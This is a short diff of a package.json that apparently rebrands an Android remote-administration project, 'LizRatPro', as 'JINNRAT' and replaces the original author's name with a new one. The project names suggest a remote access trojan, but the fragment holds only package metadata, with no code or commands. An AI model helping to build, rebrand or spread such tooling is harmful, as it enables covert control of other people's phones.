@@ -1,12 +1,12 @@
 {
-  "name": "LizRatPro",
+  "name": "JINNRAT",
   "version": "1.0.0",
-  "description": "LizRatPro - Remote Android Managment Suite",
+  "description": "JINNRAT - Remote Android Managment Suite",
   "main": "index.js",
   "scripts": {
     "test": "node index.js"
   },
-  "author": "(Liz0rd)",
+  "author": "(alvinbaby)",
   "license": "ISC",
   "dependencies": {
     "body-parser": "^1.19.0",
